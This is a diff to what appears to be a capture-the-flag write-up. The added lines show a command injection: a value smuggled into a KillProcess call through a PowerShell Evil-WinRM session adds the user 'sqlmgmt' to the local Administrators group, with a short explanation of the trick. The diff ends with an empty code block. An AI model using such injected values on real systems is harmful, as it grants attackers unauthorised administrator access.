@@ -639,7 +639,18 @@ the `x` is a placeholder for the process name the semi colon simply allows me to
 
 This is the part of the command, that i am abusing, im placing `x` as the processName then using `;` to execute another command like `whoami` then using hashtag to commend out the remainder `-Force`
 
+```python
+*Evil-WinRM* PS C:\Software\Monitoring> $client.KillProcess("x;net localgroup Administrators sqlmgmt /add;#")
+The command completed successfully.
+```
 
+So ill add the current user to the administrators group
+
+Then when i close the session and re open it:
+
+```python
+
+```
 
 
 
